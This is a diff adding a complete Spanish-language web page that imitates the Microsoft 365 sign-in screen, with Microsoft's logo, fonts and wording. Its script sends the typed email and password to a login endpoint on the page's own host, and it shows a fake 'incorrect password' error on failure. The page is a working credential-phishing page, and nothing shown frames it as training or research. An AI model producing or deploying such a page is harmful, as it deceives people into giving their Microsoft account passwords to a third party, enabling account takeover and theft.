@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Iniciar sesión en tu cuenta de Microsoft</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'><rect width='10' height='10' x='1' y='1' fill='%23F25022'/><rect width='10' height='10' x='12' y='1' fill='%237FBA00'/><rect width='10' height='10' x='1' y='12' fill='%2300A4EF'/><rect width='10' height='10' x='12' y='12' fill='%23FFB900'/></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { font-size: 16px; }
+body {
+  background: #f2f2f2;
+  font-family: 'Segoe UI', 'Open Sans', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  color: #1b1b1b;
+  -webkit-font-smoothing: antialiased;
+}
+
+.card {
+  background: #fff;
+  width: 100%;
+  max-width: 440px;
+  padding: 44px 44px 36px;
+  border-radius: 2px;
+  box-shadow: 0 2px 6px rgba(0,0,0,.2);
+}
+
+@media (max-width: 500px) {
+  .card { padding: 32px 24px 28px; }
+  body { background: #fff; }
+}
+
+.ms-logo {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 24px;
+}
+
+.ms-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 2px;
+  width: 21px;
+  height: 21px;
+}
+.ms-grid span {
+  display: block;
+}
+.ms-grid span:nth-child(1) { background: #F25022; }
+.ms-grid span:nth-child(2) { background: #7FBA00; }
+.ms-grid span:nth-child(3) { background: #00A4EF; }
+.ms-grid span:nth-child(4) { background: #FFB900; }
+
+.ms-wordmark {
+  font-size: 18px;
+  font-weight: 600;
+  color: #1b1b1b;
+  letter-spacing: -.25px;
+}
+
+h1 {
+  font-size: 24px;
+  font-weight: 600;
+  color: #1b1b1b;
+  margin-bottom: 16px;
+  line-height: 1.2;
+}
+
+.desc {
+  font-size: 13px;
+  color: #1b1b1b;
+  margin-bottom: 24px;
+}
+
+.error-box {
+  display: none;
+  background: #fde7e9;
+  border-left: 4px solid #d13438;
+  border-radius: 2px;
+  padding: 10px 12px;
+  font-size: 13px;
+  color: #d13438;
+  margin-bottom: 16px;
+}
+
+.input-group {
+  margin-bottom: 16px;
+}
+
+label {
+  display: block;
+  font-size: 13px;
+  font-weight: 600;
+  color: #1b1b1b;
+  margin-bottom: 4px;
+}
+
+input[type="text"],
+input[type="password"],
+input[type="email"] {
+  width: 100%;
+  height: 36px;
+  border: 1px solid #8a8886;
+  border-radius: 2px;
+  padding: 0 10px;
+  font-size: 15px;
+  font-family: inherit;
+  color: #1b1b1b;
+  outline: none;
+  background: #fff;
+  transition: border-color .1s;
+}
+input:focus { border-color: #0078d4; border-width: 2px; }
+input:focus + .input-line { display: none; }
+
+.input-pw-wrap { position: relative; }
+.show-pw {
+  position: absolute;
+  right: 1px;
+  top: 1px;
+  bottom: 1px;
+  background: transparent;
+  border: none;
+  padding: 0 10px;
+  font-size: 12px;
+  color: #0078d4;
+  cursor: pointer;
+  font-family: inherit;
+  font-weight: 600;
+}
+.show-pw:hover { color: #004578; }
+
+.forgot-link {
+  display: block;
+  font-size: 13px;
+  color: #0078d4;
+  text-decoration: none;
+  margin-bottom: 24px;
+  cursor: pointer;
+  background: none;
+  border: none;
+  font-family: inherit;
+  padding: 0;
+}
+.forgot-link:hover { text-decoration: underline; }
+
+.actions {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+
+.btn-primary {
+  background: #0078d4;
+  color: #fff;
+  border: none;
+  border-radius: 2px;
+  height: 36px;
+  width: 100%;
+  font-size: 15px;
+  font-weight: 600;
+  font-family: inherit;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  transition: background .1s;
+}
+.btn-primary:hover { background: #106ebe; }
+.btn-primary:disabled { opacity: .6; cursor: not-allowed; }
+
+.divider {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-size: 12px;
+  color: #8a8886;
+  margin: 4px 0;
+}
+.divider::before, .divider::after {
+  content: '';
+  flex: 1;
+  border-top: 1px solid #d2d0ce;
+}
+
+.signup-prompt {
+  font-size: 13px;
+  color: #1b1b1b;
+  text-align: center;
+}
+.signup-link {
+  color: #0078d4;
+  text-decoration: none;
+  cursor: pointer;
+  background: none;
+  border: none;
+  font-family: inherit;
+  font-size: 13px;
+}
+.signup-link:hover { text-decoration: underline; }
+
+.spinner {
+  width: 16px; height: 16px;
+  border: 2px solid rgba(255,255,255,.4);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: spin .6s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+footer {
+  margin-top: 16px;
+  text-align: center;
+  font-size: 12px;
+  color: #605e5c;
+}
+footer a { color: #605e5c; text-decoration: none; margin: 0 4px; }
+footer a:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="ms-logo">
+    <div class="ms-grid">
+      <span></span><span></span>
+      <span></span><span></span>
+    </div>
+    <span class="ms-wordmark">Microsoft</span>
+  </div>
+
+  <h1>Iniciar sesión</h1>
+  <p class="desc">Continuar en Microsoft 365</p>
+
+  <div class="error-box" id="err-box">
+    El nombre de usuario o la contraseña es incorrecto.
+  </div>
+
+  <form id="form" novalidate>
+    <div class="input-group">
+      <label for="u">Correo electrónico, teléfono o Skype</label>
+      <input type="email" id="u" name="username" autocomplete="username" placeholder="" required>
+    </div>
+    <div class="input-group">
+      <label for="p">Contraseña</label>
+      <div class="input-pw-wrap">
+        <input type="password" id="p" name="password" autocomplete="current-password" required style="padding-right:60px">
+        <button type="button" class="show-pw" id="show-pw">Mostrar</button>
+      </div>
+    </div>
+    <button type="button" class="forgot-link">¿Olvidaste tu contraseña?</button>
+    <div class="actions">
+      <button type="submit" class="btn-primary" id="btn">Siguiente</button>
+      <div class="divider">o</div>
+      <div class="signup-prompt">
+        ¿No tienes una cuenta? <button type="button" class="signup-link">Créala</button>
+      </div>
+    </div>
+  </form>
+</div>
+
+<footer>
+  <a href="#">Condiciones de uso</a>
+  <a href="#">Privacidad y cookies</a>
+  <a href="#">...</a>
+</footer>
+
+<script>
+const showPw = document.getElementById('show-pw');
+showPw.addEventListener('click', () => {
+  const p = document.getElementById('p');
+  if (p.type === 'password') { p.type = 'text'; showPw.textContent = 'Ocultar'; }
+  else { p.type = 'password'; showPw.textContent = 'Mostrar'; }
+});
+
+document.getElementById('form').addEventListener('submit', async e => {
+  e.preventDefault();
+  const btn = document.getElementById('btn');
+  const errBox = document.getElementById('err-box');
+  errBox.style.display = 'none';
+  btn.innerHTML = '<div class="spinner"></div>';
+  btn.disabled = true;
+  try {
+    const r = await fetch('/api/auth/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: document.getElementById('u').value, password: document.getElementById('p').value })
+    });
+    if (!r.ok) errBox.style.display = 'block';
+  } catch { errBox.style.display = 'block'; }
+  btn.innerHTML = 'Siguiente';
+  btn.disabled = false;
+});
+</script>
+</body>
+</html>
